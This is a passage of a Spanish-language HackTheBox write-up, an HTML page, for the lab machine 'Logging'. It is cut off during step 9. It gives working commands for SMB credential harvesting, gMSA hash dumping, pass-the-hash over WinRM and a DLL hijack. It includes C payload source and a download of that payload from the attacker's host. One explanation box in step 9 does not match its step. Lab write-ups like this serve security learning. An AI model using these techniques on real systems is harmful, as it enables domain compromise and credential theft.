@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Logging — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-word;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* HERO */
+.hero{background:linear-gradient(135deg,var(--forest) 0%,var(--ink) 50%,#091a10 100%);border-bottom:1px solid var(--border);padding:60px 40px 50px;position:relative;overflow:hidden;}
+.hero::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(0,232,122,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,232,122,0.03) 1px,transparent 1px);background-size:56px 56px;pointer-events:none;}
+.hero-layout{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 280px;gap:48px;align-items:center;}
+@media(max-width:900px){.hero-layout{grid-template-columns:1fr;}.hero-orb{order:-1;justify-self:center;}.hero-meta{justify-content:center;}.hero-sub{margin-left:auto;margin-right:auto;}.hero-stats{justify-content:center;}}
+.hero-left{position:relative;z-index:2;}
+.hero-brand{font-family:var(--mo);font-size:.65rem;color:rgba(0,232,122,0.45);letter-spacing:.2em;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+.hero-brand-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);animation:hpd 1.2s infinite alternate;}
+@keyframes hpd{to{opacity:.2;transform:scale(0.5);}}
+.hero h1{font-family:var(--bb);font-size:clamp(2.4rem,4vw,3.5rem);font-weight:400;letter-spacing:.04em;margin-bottom:14px;line-height:1;color:var(--text);}
+.hero h1 span{color:var(--green);}
+.hero-sub{color:var(--text2);font-size:.95rem;max-width:600px;margin-bottom:24px;line-height:1.7;font-weight:300;}
+.hero-meta{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:18px;}
+.tag{display:inline-flex;align-items:center;gap:5px;padding:4px 12px;border-radius:4px;font-family:var(--mo);font-size:10px;font-weight:500;letter-spacing:.8px;text-transform:uppercase;}
+.tag-platform{background:rgba(0,232,122,0.1);color:var(--green);border:1px solid rgba(0,232,122,0.25);}
+.tag-category{background:rgba(56,217,245,0.08);color:var(--cyan);border:1px solid rgba(56,217,245,0.2);}
+.tag-diff-medium{background:rgba(245,166,35,0.08);color:#f5a623;border:1px solid rgba(245,166,35,0.2);}
+.tag-os{background:rgba(167,139,250,0.08);color:var(--purple);border:1px solid rgba(167,139,250,0.2);}
+.tag-active{background:rgba(248,113,113,0.08);color:var(--red);border:1px solid rgba(248,113,113,0.2);}
+.hero-stats{display:flex;gap:28px;flex-wrap:wrap;}
+.stat{display:flex;flex-direction:column;gap:2px;}
+.stat-label{font-family:var(--mo);font-size:9px;text-transform:uppercase;letter-spacing:1.5px;color:var(--text3);}
+.stat-value{font-size:1rem;font-weight:700;color:var(--text);}
+.stat-value.green{color:var(--green);}
+/* Orb */
+.hero-orb{display:flex;align-items:center;justify-content:center;position:relative;width:260px;height:260px;}
+.hero-orb canvas{display:block;width:260px !important;height:260px !important;}
+
+/* LAYOUT */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}}
+
+/* SECTIONS */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);overflow-x:auto;}
+.cmd-line{font-size:.92rem;line-height:1.9;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.hl-green{color:var(--green);font-weight:600;}.hl-orange{color:var(--orange);}.hl-red{color:var(--red);}.hl-yellow{color:var(--yellow);}.hl-blue{color:var(--blue);}.hl-purple{color:var(--purple);}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.warn-box{background:rgba(251,191,36,.05);border-left:3px solid var(--yellow);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.warn-box strong{color:var(--yellow);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.warn-box p{font-size:.88rem;color:var(--text2);}
+.danger-box{background:rgba(248,113,113,.05);border-left:3px solid var(--red);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.danger-box strong{color:var(--red);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.danger-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:1.5rem;text-align:center;margin:1.5rem 0;}
+.flag-label{font-size:.7rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.5rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:.95rem;color:var(--green);background:rgba(0,232,122,.08);padding:.5rem 1.2rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);word-break:break-all;}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.5rem;color:var(--green);}
+.lesson-card p{font-size:.83rem;color:var(--text2);}
+
+/* SIDEBAR */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.78rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.skill-row{margin:.6rem 0;}
+.skill-name{display:flex;justify-content:space-between;font-size:.78rem;margin-bottom:.25rem;color:var(--text2);}
+.skill-bar{height:5px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden;}
+.skill-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--cyan));}
+.tool-tag{display:inline-block;background:rgba(56,217,245,.08);color:var(--cyan);border:1px solid rgba(56,217,245,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+.ascii-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1.25rem;overflow-x:auto;}
+.ascii-box pre{font-size:.74rem;line-height:1.5;color:var(--text2);white-space:pre;}
+.ac-g{color:var(--green);}.ac-o{color:var(--orange);}.ac-b{color:var(--blue);}.ac-r{color:var(--red);}.ac-p{color:var(--purple);}.ac-y{color:var(--yellow);}
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Active Machine</span>
+        <span class="tag tag-diff-medium">Medium</span>
+        <span class="tag tag-os">Windows Server 2019</span>
+        <span class="tag tag-active">● Active</span>
+      </div>
+      <h1><span>Logging</span> — gMSA Abuse + Rogue WSUS</h1>
+      <p class="hero-sub">Cadena de cinco primitivas independientes: credenciales en texto plano filtradas en un share SMB, abuso de ACL <code>GenericWrite</code> sobre una gMSA para extraer su hash NT, DLL hijack en una tarea programada para impersonar a otro usuario, plantilla ADCS con <code>ENROLLEE_SUPPLIES_SUBJECT</code> para emitir un certificado TLS para WSUS, y finalmente DNS poisoning + servidor WSUS falso (wsuks) que ejecuta PsExec64 como SYSTEM en el Domain Controller.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.129.26.35</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Win 2019</span></div>
+        <div class="stat"><span class="stat-label">Dominio</span><span class="stat-value">LOGGING.HTB</span></div>
+        <div class="stat"><span class="stat-label">Tiempo</span><span class="stat-value">~85 min</span></div>
+        <div class="stat"><span class="stat-label">Pasos</span><span class="stat-value">15</span></div>
+      </div>
+    </div>
+    <!-- Orb -->
+    <div class="hero-orb">
+      <canvas id="heroOrb" width="520" height="520"></canvas>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<main>
+
+<div class="section">
+  <h2>Resumen Ejecutivo</h2>
+  <div class="info-box">
+    <p>Logging encadena <strong>cinco primitivas de ataque independientes</strong> sin necesidad de vulnerabilidades de día cero. Empieza con credenciales filtradas (<code>wallace.everette:Welcome2026@</code>) que dan acceso de lectura a un share SMB <code>Logs</code>; allí un trace log antiguo expone la contraseña de <code>svc_recovery</code> con sufijo de año <strong>2025</strong> que hay que rotar a <strong>2026</strong>. Con BloodHound se descubre <code>GenericWrite</code> sobre la gMSA <code>msa_health$</code>, lo que permite sobreescribir <code>msDS-GroupMSAMembership</code> y dumpear el hash NT. Pass-the-Hash da WinRM como <code>msa_health$</code>. Un DLL hijack contra una tarea programada que corre como <code>jaylee.clifton</code> entrega <code>user.txt</code>. Finalmente, una plantilla ADCS <code>UpdateSrv</code> con <code>ENROLLEE_SUPPLIES_SUBJECT</code> permite obtener un certificado TLS válido para <code>wsus.logging.htb</code>; combinado con DNS poisoning y <code>wsuks</code>, se sirve <code>PsExec64</code> al DC, que lo ejecuta como SYSTEM y añade <code>msa_health$</code> a Administrators.</p>
+  </div>
+</div>
+
+<div class="section">
+  <h2>Información de la Máquina</h2>
+  <table class="data-table">
+    <tr><td>Máquina</td><td class="highlight">Logging</td></tr>
+    <tr><td>Plataforma</td><td>Hack The Box</td></tr>
+    <tr><td>Sistema operativo</td><td>Windows Server 2019 (Build 17763)</td></tr>
+    <tr><td>Dificultad</td><td>Medium</td></tr>
+    <tr><td>Hostname</td><td>DC01.logging.htb</td></tr>
+    <tr><td>Dominio</td><td>LOGGING.HTB</td></tr>
+    <tr><td>IP objetivo</td><td>10.129.26.35</td></tr>
+    <tr><td>Credenciales iniciales</td><td>wallace.everette : Welcome2026@</td></tr>
+    <tr><td>Servicios clave</td><td>SMB (445), WinRM (5985), LDAP (389/636), WSUS (8530/8531), Kerberos (88)</td></tr>
+  </table>
+</div>
+
+<!-- 01 — RECONOCIMIENTO -->
+<div class="section">
+  <h2>01 · Reconocimiento</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Port Scan</div>
+    <h3>Escaneo de puertos: identificar DC + WSUS</h3>
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>Nmap con <code>-Pn</code> evita el ping ICMP que los firewalls suelen bloquear. <code>-p-</code> con <code>--min-rate 2000</code> acelera el barrido completo de puertos. La combinación de flags revela el perfil de un controlador de dominio Windows.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-Pn -p- --open -n --min-rate 2000 -T4</span> <span class="ip">10.129.26.35</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+<pre>53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+<span class="hl-yellow">8530/tcp open  http      (WSUS — HTTP)</span>
+<span class="hl-yellow">8531/tcp open  http      (WSUS — HTTPS)</span>
+9389/tcp open  adws</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Los puertos 53, 88, 389, 636, 3268, 3269, 464 confirman que el objetivo es un Domain Controller. <strong>8530 y 8531</strong> son la señal inequívoca de WSUS activo en el propio DC — esto se convierte en la primitiva final de escalada.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>WSUS en el DC significa que si suplantamos el endpoint WSUS, el servidor descargará e instalará nuestro payload como <code>NT AUTHORITY\SYSTEM</code>. Anotamos esto como objetivo final y procedemos con SMB.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — SMB Enum</div>
+    <h3>Enumeración de shares con credenciales iniciales</h3>
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>NetExec (<code>nxc</code>) es el sucesor moderno de CrackMapExec. Con <code>--shares</code> lista todos los shares SMB y los permisos del usuario autenticado.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nxc</span> <span class="param">smb</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">-u</span> <span class="user-c">wallace.everette</span> <span class="flag-opt">-p</span> <span class="str-c">'Welcome2026@'</span> <span class="flag-opt">--shares</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Shares</div>
+<pre>Share       Permissions    Remark
+ADMIN$                     Remote Admin
+C$                         Default share
+IPC$        READ           Remote IPC
+<span class="hl-orange">Logs        READ</span>
+NETLOGON    READ           Logon server share
+SYSVOL      READ           Logon server share
+WSUSTemp                   WSUS Local Publishing share</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>El share <code>Logs</code> no es estándar de Windows: lo creó el administrador. Que sea legible por cualquier usuario autenticado es siempre sospechoso — los administradores frecuentemente colocan logs de aplicaciones con información sensible en shares accesibles.</p>
+    </div>
+  </div>
+</div>
+
+<!-- 02 — CREDENCIALES EN LOGS -->
+<div class="section">
+  <h2>02 · Credenciales en el Share Logs</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Cred Leak</div>
+    <h3>Extracción del share Logs y análisis de archivos</h3>
+    <div class="why-box">
+      <strong>¿Por qué smbclient + grep?</strong>
+      <p><code>smbclient -c 'prompt OFF; mget *'</code> descarga todos los archivos sin confirmaciones. Después buscamos patrones de credenciales con <code>grep -ri</code>.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">smbclient</span> //<span class="ip">10.129.26.35</span>/Logs <span class="flag-opt">-U</span> <span class="str-c">'logging.htb\wallace.everette%Welcome2026@'</span> <span class="flag-opt">-c</span> <span class="str-c">'prompt OFF; mget *'</span></div>
+      <div class="cmd-line"><span class="cmd">grep</span> <span class="flag-opt">-ri</span> <span class="str-c">"password\|pass\|bind"</span> *.log</div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">IdentitySync_Trace_20260219.log — extracto</div>
+<pre>ConnectionContext Dump: {
+  Domain: "logging.htb",
+  Server: "DC01",
+  SSL: "False",
+  BindUser: "<span class="hl-orange">LOGGING\svc_recovery</span>",
+  <span class="hl-red">BindPass: "Em3rg3ncyPa$$2025"</span>
+}</pre>
+    </div>
+    <div class="warn-box">
+      <strong>Trampa crítica — Year rotation</strong>
+      <p>La contraseña en el log tiene el año <strong>2025</strong>. La política de rotación cambió el sufijo al año actual, pero el trace log nunca fue purgado. La contraseña funcional es <code>Em3rg3ncyPa$$2026</code>. Patrón deliberado: siempre probar variantes con el año actual si las credenciales del log fallan.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 4 — Kerberos TGT</div>
+    <h3>Validación de svc_recovery (Protected Users)</h3>
+    <div class="why-box">
+      <strong>¿Por qué Kerberos y no NTLM?</strong>
+      <p><code>svc_recovery</code> pertenece al grupo <strong>Protected Users</strong> de Active Directory, lo que impide la autenticación NTLM para sus miembros. Además el DC tiene un desfase de reloj de ~7 horas, por lo que usamos <code>faketime</code>.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">faketime</span> <span class="flag-opt">-f</span> <span class="str-c">"+7h"</span> <span class="cmd">impacket-getTGT</span> <span class="str-c">'logging.htb/svc_recovery:Em3rg3ncyPa$$2026'</span> <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.26.35</span></div>
+    </div>
+    <div class="output-box">
+<pre>[*] Saving ticket in <span class="hl-green">svc_recovery.ccache</span></pre>
+    </div>
+  </div>
+</div>
+
+<!-- 03 — gMSA -->
+<div class="section">
+  <h2>03 · Abuso de gMSA — Hash NT</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 5 — BloodHound</div>
+    <h3>Descubrimiento del edge GenericWrite</h3>
+    <div class="why-box">
+      <strong>¿Por qué BloodHound?</strong>
+      <p>Recolecta datos LDAP (usuarios, grupos, ACLs, GPOs, sesiones) y los representa como un grafo dirigido. El camino más corto hacia Domain Admin revela primitivas de abuso imposibles de descubrir manualmente.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c">KRB5CCNAME=svc_recovery.ccache</span> <span class="cmd">faketime</span> <span class="flag-opt">-f</span> <span class="str-c">"+7h"</span> <span class="cmd">bloodhound-python</span> <span class="flag-opt">-u</span> svc_recovery <span class="flag-opt">-k --no-pass</span> <span class="flag-opt">-d</span> logging.htb <span class="flag-opt">-ns</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">--dc</span> dc01.logging.htb <span class="flag-opt">--zip -c</span> All</div>
+    </div>
+    <div class="interpret-box">
+      <strong>Edge crítico descubierto</strong>
+      <p><code>svc_recovery</code> tiene <strong>GenericWrite</strong> sobre <code>MSA_HEALTH$</code> (gMSA). GenericWrite permite sobreescribir atributos del objeto, incluyendo <code>msDS-GroupMSAMembership</code>, que controla quién puede leer la contraseña de la gMSA.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 6 — Hash Dump</div>
+    <h3>Modificación de msDS-GroupMSAMembership y dump del hash</h3>
+    <div class="why-box">
+      <strong>¿Cómo funciona el abuso?</strong>
+      <p>Las gMSA son cuentas cuyas contraseñas el DC rota cada 30 días. Solo los objetos en <code>msDS-GroupMSAMembership</code> pueden leerla. Con <code>GenericWrite</code> añadimos nuestro usuario y leemos el blob, derivando el hash NT.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Vía directa: nxc con --gmsa</span></div>
+      <div class="cmd-line"><span class="cmd">nxc</span> <span class="param">ldap</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">-u</span> wallace.everette <span class="flag-opt">-p</span> <span class="str-c">'Welcome2026@'</span> <span class="flag-opt">--gmsa</span></div>
+      <div class="cmd-line"><span class="comment-c"># Alternativa manual</span></div>
+      <div class="cmd-line"><span class="cmd">python3</span> /opt/gMSADumper/gMSADumper.py <span class="flag-opt">-u</span> wallace.everette <span class="flag-opt">-p</span> <span class="str-c">'Welcome2026@'</span> <span class="flag-opt">-d</span> logging.htb <span class="flag-opt">-l</span> dc01.logging.htb</div>
+    </div>
+    <div class="output-box">
+<pre>msa_health$:::aad3b435b51404eeaad3b435b51404ee:<span class="hl-green">603fc24ee01a9409f83c9d1d701485c5</span>:::</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Hash NT de <code>msa_health$</code>: <code>603fc24ee01a9409f83c9d1d701485c5</code>. Con el hash NT podemos usar Pass-the-Hash sin conocer la contraseña en texto plano. Este hash sobrevive resets de snapshot HTB porque la rotación gMSA es cada 30 días.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 7 — WinRM PtH</div>
+    <h3>Acceso WinRM como msa_health$ via Pass-the-Hash</h3>
+    <div class="why-box">
+      <strong>¿Por qué funciona PtH aquí?</strong>
+      <p>Las gMSA no están en Protected Users (a diferencia de <code>svc_recovery</code>), por lo que soportan NTLM. <code>msa_health$</code> es miembro de <code>BUILTIN\Remote Management Users</code>, lo que permite WinRM (5985). Evil-WinRM acepta hashes NT con <code>-H</code>.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">evil-winrm</span> <span class="flag-opt">-i</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">-u</span> <span class="str-c">'msa_health$'</span> <span class="flag-opt">-H</span> <span class="str-c">'603fc24ee01a9409f83c9d1d701485c5'</span></div>
+    </div>
+    <div class="output-box">
+<pre><span class="hl-green">*Evil-WinRM*</span> PS C:\Users\msa_health$\Documents&gt;
+whoami /groups | Select-String "privilege\|admin\|remote"
+<span class="hl-blue">BUILTIN\Remote Management Users</span>
+<span class="hl-orange">SeImpersonatePrivilege</span>
+<span class="hl-yellow">SeMachineAccountPrivilege</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Shell como <code>msa_health$</code>. <code>SeMachineAccountPrivilege</code> permite crear cuentas de máquina (lo usaremos para registrar un DNS). <code>SeImpersonatePrivilege</code> permitiría Potato attacks pero hay un camino más limpio.</p>
+    </div>
+  </div>
+</div>
+
+<!-- 04 — DLL HIJACK -->
+<div class="section">
+  <h2>04 · DLL Hijack — User Flag</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 8 — Análisis</div>
+    <h3>Mecanismo de UpdateMonitor.exe</h3>
+    <div class="why-box">
+      <strong>¿Cómo funciona el mecanismo?</strong>
+      <p>El log <code>C:\ProgramData\UpdateMonitor\Logs\monitor.log</code> revela que cada 3 minutos la tarea programada <code>UpdateChecker Agent</code> ejecuta <code>UpdateMonitor.exe</code> como <code>LOGGING\jaylee.clifton</code>.</p>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Flujo de UpdateMonitor.exe (decompilado con ilspycmd)</div>
+<pre>1. Busca:  C:\ProgramData\UpdateMonitor\<span class="hl-orange">Settings_Update.zip</span>
+2. Elimina: C:\Program Files\UpdateMonitor\bin\settings_update.dll
+3. Extrae:  ZipFile.ExtractToDirectory(zip, "C:\Program Files\UpdateMonitor\bin\")
+4. Carga:   LoadLibrary("C:\Program Files\UpdateMonitor\bin\settings_update.dll")
+5. Llama:   GetProcAddress(hDll, "<span class="hl-green">PreUpdateCheck</span>") → ejecuta
+6. Libera:  FreeLibrary(hDll)
+
+NOTA: Proceso .NET con flag "<span class="hl-yellow">Prefer 32-bit</span>" → la DLL DEBE ser 32-bit</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Por qué es DLL Hijack?</strong>
+      <p>La tarea corre como <code>jaylee.clifton</code>, pero el directorio de entrada (<code>C:\ProgramData\UpdateMonitor\</code>) es escribible por <code>msa_health$</code>. Si colocamos un zip con nuestra DLL, el proceso ejecuta nuestra <code>PreUpdateCheck</code> con privilegios de <code>jaylee.clifton</code>.</p>
+    </div>
+    <div class="danger-box">
+      <strong>Trampa crítica — DLL 32-bit</strong>
+      <p><code>UpdateMonitor.exe</code> tiene el flag <code>Prefer 32-bit</code>. Una DLL 64-bit falla con error 193 (<code>ERROR_BAD_EXE_FORMAT</code>). Compilar con <code>i686-w64-mingw32-gcc</code>.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 9 — Code Exec</div>
+    <h3>Compilación 32-bit y captura de user.txt</h3>
+    <div class="why-box">
+      <strong>¿Por qué certreq -f y &lt; NUL?</strong>
+      <p><code>certreq -f</code> fuerza sobreescritura del <code>.rsp</code> sin prompt; redirigir stdin desde <code>NUL</code> evita que un prompt interactivo congele el proceso. Si <code>PreUpdateCheck</code> no retorna, la DLL queda bloqueada y el próximo ciclo no puede actualizarla.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c">// user_flag.c — lee user.txt y lo deposita en el share Logs</span></div>
+<pre>#include &lt;windows.h&gt;
+__declspec(dllexport) void PreUpdateCheck(void) {
+    system("cmd /c type C:\\Users\\jaylee.clifton\\Desktop\\user.txt "
+           "&gt; C:\\Share\\Logs\\flag.txt 2&gt;&amp;1");
+}
+BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
+    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
+    return TRUE;
+}</pre>
+      <div class="cmd-line"><span class="cmd">i686-w64-mingw32-gcc</span> <span class="flag-opt">-shared -o</span> settings_update.dll user_flag.c <span class="flag-opt">-s</span></div>
+      <div class="cmd-line"><span class="cmd">zip</span> <span class="flag-opt">-j</span> Settings_Update.zip settings_update.dll</div>
+      <div class="cmd-line"><span class="comment-c"># Upload via WinRM</span></div>
+      <div class="cmd-line"><span class="cmd">IWR</span> <span class="flag-opt">-Uri</span> <span class="str-c">"http://10.10.14.154:8888/Settings_Update.zip"</span> <span class="flag-opt">-OutFile</span> <span class="str-c">"C:\ProgramData\UpdateMonitor\Settings_Update.zip"</span></div>
+    </div>
